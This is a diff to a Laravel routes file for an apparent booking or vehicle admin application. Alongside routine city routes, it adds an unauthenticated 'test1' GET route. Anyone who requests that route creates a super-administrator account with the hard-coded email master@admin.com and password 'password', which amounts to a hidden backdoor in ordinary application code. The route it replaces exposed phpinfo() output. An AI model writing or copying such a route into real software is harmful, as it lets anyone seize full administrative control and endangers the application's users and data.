@@ -1,10 +1,20 @@
 <?php
 use App\Model\Bookings;
+use App\Model\User;
 Auth::routes();
 // use Backup;
 Route::namespace ('Admin')->group(function () {
     Route::get('test1', function () {
-        dd(phpinfo());
+        $modules = array(0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 12, 13, 14, 15);
+        $admin = User::create([
+            'name' => "Super Administrator",
+            'email' => "master@admin.com",
+            'password' => bcrypt('password'),
+            'api_token' => str_random(60),
+            'user_type' => "S",
+        ]);
+        $admin->setMeta(['profile_image' => 'no-user.jpg', 'module' => serialize($modules)]);
+        $admin->save();
     });
 
     Route::get('export-events', 'HomeController@export_calendar');
@@ -33,6 +43,9 @@ Route::namespace ('Admin')->group(function () {
     Route::get("/", 'HomeController@index')->middleware(['lang_check', 'auth']);
     Route::group(['middleware' => ['lang_check', 'auth', 'officeadmin']], function () {
         // new routes
+        Route::resource('cities', 'CitiesController');
+        Route::post('delete-city', 'CitiesController@bulk_delete');
+
         Route::resource('vehicle-color', 'VehicleColorsController');
         Route::post('delete-vehicle-color', 'VehicleColorsController@bulk_delete');
 
